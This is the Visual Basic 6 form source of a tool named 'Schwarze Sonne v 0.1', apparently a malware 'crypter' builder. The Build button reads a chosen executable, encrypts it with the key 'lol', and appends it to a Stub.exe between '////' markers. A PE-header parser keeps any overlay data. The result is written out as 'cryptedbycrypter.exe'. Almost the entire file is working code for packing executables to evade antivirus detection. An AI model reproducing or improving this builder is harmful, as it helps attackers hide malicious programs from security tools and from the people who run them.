VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "comdlg32.ocx"
Begin VB.Form Form1 
   Caption         =   "Schwarze Sonne v 0.1"
   ClientHeight    =   915
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   3735
   BeginProperty Font 
      Name            =   "Tahoma"
      Size            =   8.25
      Charset         =   0
      Weight          =   400
      Underline       =   0   'False
      Italic          =   0   'False
      Strikethrough   =   0   'False
   EndProperty
   LinkTopic       =   "Form1"
   ScaleHeight     =   915
   ScaleWidth      =   3735
   StartUpPosition =   3  'Windows-Standard
   Begin MSComDlg.CommonDialog CommonDialog1 
      Left            =   1200
      Top             =   480
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin Projekt1.ThemedButton ThemedButton3 
      Height          =   375
      Left            =   1800
      TabIndex        =   3
      Top             =   480
      Width           =   975
      _ExtentX        =   1720
      _ExtentY        =   661
      Caption         =   "Infos"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MouseIcon       =   "Form1.frx":0000
      Picture         =   "Form1.frx":059A
      PictureAlign    =   1
      PictureSize     =   0
   End
   Begin Projekt1.ThemedButton ThemedButton2 
      Height          =   375
      Left            =   2880
      TabIndex        =   2
      Top             =   480
      Width           =   855
      _ExtentX        =   1508
      _ExtentY        =   661
      Caption         =   "Build"
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MouseIcon       =   "Form1.frx":0983
      Picture         =   "Form1.frx":0F1D
      PictureAlign    =   1
      PictureSize     =   0
   End
   Begin Projekt1.ThemedButton ThemedButton1 
      Height          =   255
      Left            =   3360
      TabIndex        =   1
      Top             =   120
      Width           =   375
      _ExtentX        =   661
      _ExtentY        =   450
      Caption         =   "..."
      BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      MouseIcon       =   "Form1.frx":1317
      PictureSize     =   0
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   3135
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, Src As Any, ByVal L As Long)
Private Sub ThemedButton1_Click()
CommonDialog1.Filter = "Exe|*.exe"
CommonDialog1.ShowOpen
If CommonDialog1.FileName <> "" Then
Text1.Text = CommonDialog1.FileName
End If
End Sub

Private Sub ThemedButton2_Click()
Dim seininhalt As String
Dim deininhalt As String
Dim terz As String
Dim hierundda As String
If Text1.Text = "" Then
MsgBox "Cant find File"
Exit Sub
End If
Open Text1.Text For Binary As #1
seininhalt = Space(LOF(1))
Get #1, , seininhalt
Close #1
Open App.Path & "\Stub.exe" For Binary As #1
deininhalt = Space(LOF(1))
Get #1, , deininhalt
Close #1
seininhalt = deininhalt & "////" & strEncrypt(seininhalt, "lol") & "////" & Mid(seininhalt, GetEOF(Text1.Text), Len(seininhalt))
Open App.Path & "\cryptedbycrypter.exe" For Binary As #1
Put #1, , seininhalt
Close #1
MsgBox "Complete"
End Sub
Function GetEOF(Path As String) As Long

    Dim ByteArray() As Byte
    Dim PE As Long, NumberOfSections As Integer
    Dim BeginLastSection As Long
    Dim RawSize As Long, RawOffset As Long
       
    Open Path For Binary As #1
        ReDim ByteArray(LOF(1) - 1)
        Get #1, , ByteArray
    Close #1
   
    Call CopyMemory(PE, ByteArray(&H3C), 4)
    Call CopyMemory(NumberOfSections, ByteArray(PE + &H6), 2)
    BeginLastSection = PE + &HF8 + ((NumberOfSections - 1) * &H28)
    Call CopyMemory(RawSize, ByteArray(BeginLastSection + 16), 4)
    Call CopyMemory(RawOffset, ByteArray(BeginLastSection + 20), 4)
    GetEOF = RawSize + RawOffset
   
End Function

Private Sub ThemedButton3_Click()
Form2.Show
End Sub
